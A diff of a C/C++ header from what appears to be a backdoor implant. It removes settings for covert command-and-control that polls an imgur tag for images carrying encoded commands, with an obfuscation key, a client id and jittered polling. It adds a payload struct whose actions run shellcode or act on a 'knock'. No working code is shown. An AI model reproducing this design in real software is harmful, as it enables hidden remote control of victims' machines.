@@ -23,27 +23,20 @@
 //
 #pragma once
 
-#ifdef __cplusplus
-inline unsigned operator "" _sec(unsigned long long int n)  { return static_cast<unsigned int>(n * 1000); }
-inline unsigned operator "" _min(unsigned long long int n)  { return static_cast<unsigned int>(n * 60 * 1000); }
-inline unsigned operator "" _hour(unsigned long long int n) { return static_cast<unsigned int>(n * 60 * 60 * 1000); }
-#endif
+#include <stdint.h>
+#include "context.h"
 
-// 64bit integer. A key used for obfuscating various data.
-#define vr_shared_key 0x982147b5bea3f6c2ull
+#define payload_magic_v1 0xdfc14973u
+#define payload_action_shellcode 0
+#define payload_action_knock 1
 
-// String. Client id to be used for scanning imgur.
-#define vr_imgur_client_id "546c25a59c58ad7"
+#pragma pack(1)
+struct vr_payload
+{
+    uint32_t magic;
+    uint32_t timestamp;
+    uint8_t action;
+};
+#pragma pack()
 
-// String. imgur.com tag in which http module will look for images with encoded commands
-#define vr_imgur_tag "png"
-
-// Integer. Time between imgur tag queries
-#define vr_imgur_tag_query_time 15_min
-
-// Integer. Random time added to imgur tag query time
-#define vr_imgur_tag_query_time_jitter 1_min
-
-// Private variables, do not modify.
-#define vr_mutant_main_instance 0x1000
-#define gts_shared_memory_name  0x1001
+bool handle_payload(context& ctx, uint8_t* data, unsigned len, void* userdata=nullptr);
